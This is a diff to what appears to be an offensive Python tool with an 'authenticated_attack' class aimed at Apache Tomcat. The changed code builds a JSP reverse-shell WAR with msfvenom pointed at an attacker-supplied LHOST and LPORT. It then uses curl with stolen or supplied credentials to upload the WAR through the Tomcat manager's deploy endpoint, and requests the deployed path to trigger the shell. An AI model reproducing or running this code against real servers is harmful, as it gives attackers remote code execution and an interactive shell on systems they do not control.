@@ -242,12 +242,10 @@ class authenticated_attack(tomcat):
                     if os.path.exists(f"reverse/{filename}.war"):
                         os.remove(f"reverse/{filename}.war")
 
-                    command = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={args.lhost} LPORT={args.lport} -f raw -o reverse/{filename}.war"
+                    subprocess.run(["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}", "-f", "war", "-o", f"{filename}.war"], check=True, capture_output=True)
 
-                    subprocess.run(command, shell=True, check=True)
-
-                    command = f'curl --upload-file reverse/{filename}.war -u "{self.username}:{self.password}" "{self.url}manager/text/deploy?path=/{filename}"'
-                    subprocess.run(command, shell=True, check=True)
+                    command = f'curl --upload-file {filename}.war -u "{self.username}:{self.password}" "{self.url}manager/text/deploy?path=/{filename}"'
+                    subprocess.run(command, shell=True, check=True, capture_output=True)
 
                     requests.get(url=f"{self.url}{filename}/")
 
